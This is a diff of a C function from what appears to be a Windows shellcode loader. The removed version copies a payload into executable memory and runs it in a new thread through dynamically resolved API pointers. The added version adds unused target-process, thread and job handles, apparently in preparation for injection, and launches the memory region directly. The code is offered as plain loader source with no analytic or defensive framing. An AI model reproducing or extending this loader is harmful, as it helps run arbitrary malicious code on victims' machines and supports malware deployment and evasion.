@@ -1,23 +1,13 @@
-void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len) {
-    HANDLE hThread;
+void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
+    (void)hTargetProcess;
+    (void)hTargetThread;
+    (void)hJob;
+    (void)payload;
+    (void)payload_len;
 
-    if (exec_mem == NULL || payload == NULL) {
-        DEBUG_PRINT("ExecutePayload: Received a NULL pointer. Aborting.");
-        return;
+    DEBUG_PRINT("Executing payload via CreateThread...");
+    HANDLE hThread = pfnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    if (hThread != NULL) {
+        pfnWaitForSingleObject(hThread, INFINITE);
     }
-
-    pfnRtlMoveMemory(exec_mem, payload, payload_len);
-    DEBUG_PRINT("ExecutePayload: Bytecode copied to executable memory at %p.", exec_mem);
-
-    DEBUG_PRINT("ExecutePayload: Creating new thread to execute payload...");
-    hThread = pfnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
-    if (hThread == NULL) {
-        DEBUG_PRINT("ExecutePayload: CreateThread failed!");
-        return;
-    }
-
-    DEBUG_PRINT("ExecutePayload: Waiting for payload thread to complete...");
-    pfnWaitForSingleObject(hThread, INFINITE);
-    pfnCloseHandle(hThread);
-    DEBUG_PRINT("ExecutePayload: Payload thread finished.");
 }
